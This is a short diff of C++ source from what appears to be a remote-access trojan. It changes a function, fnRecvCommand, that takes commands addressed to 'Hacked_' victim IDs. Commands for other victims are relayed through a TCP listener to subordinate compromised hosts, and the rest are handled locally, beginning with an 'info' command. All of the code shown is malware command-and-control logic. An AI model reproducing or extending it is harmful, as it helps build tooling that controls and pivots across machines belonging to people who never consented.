@@ -57,36 +57,39 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
     if (vuMsg.size() == 0)
         return;
 
-    std::string szVictimID = "";
-
-    if (szVictimID.rfind("Hacked_", 0) == 0)
-    {
-        if (szVictimID == "")
-        {
-            szVictimID = vuMsg[0];
-            
-        }
-    }
-
     clsDebugTools::fnPrintStringList(vuMsg);
 
     std::vector<std::string> vsMsg;
-    if (szVictimID == "")
+    if (vuMsg[0].rfind("Hacked_", 0) == 0)
     {
-        vsMsg.insert(vsMsg.end(), vuMsg.begin(), vuMsg.end());
-    }
-    else if (szVictimID == victim.m_szVictimID)
-    {
+        vsMsg.reserve(vuMsg.size() - 1);
         vsMsg.insert(vsMsg.end(), vuMsg.begin() + 1, vuMsg.end());
+
+        clsInfoSpyder infoSpider;
+        std::string szVictimID = vuMsg[0];
+        if (szVictimID != "Hacked_" + infoSpider.m_info.m_szMachineID)
+        {
+            if (g_ltpTcp != nullptr)
+                g_ltpTcp->fnSendToSub(szVictimID, vsMsg);
+
+            return;
+        }
+        else if (szVictimID == "Hacked_" + infoSpider.m_info.m_szMachineID && vuMsg[1].rfind("Hacked", 0) == 0)
+        {
+            if (g_ltpTcp != nullptr)
+                g_ltpTcp->fnSendToSub(szVictimID, vsMsg);
+
+            return;
+        }
+        else
+        {
+            
+        }
     }
     else
     {
-        vsMsg.insert(vsMsg.end(), vuMsg.begin() + 1, vuMsg.end());
-        if (g_ltpTcp != nullptr)
-            g_ltpTcp->fnSendToSub(szVictimID, vsMsg);
-            
-
-        return;
+        vsMsg.reserve(vuMsg.size());
+        vsMsg.insert(vsMsg.end(), vuMsg.begin(), vuMsg.end());
     }
 
     if (vsMsg[0] == "info")
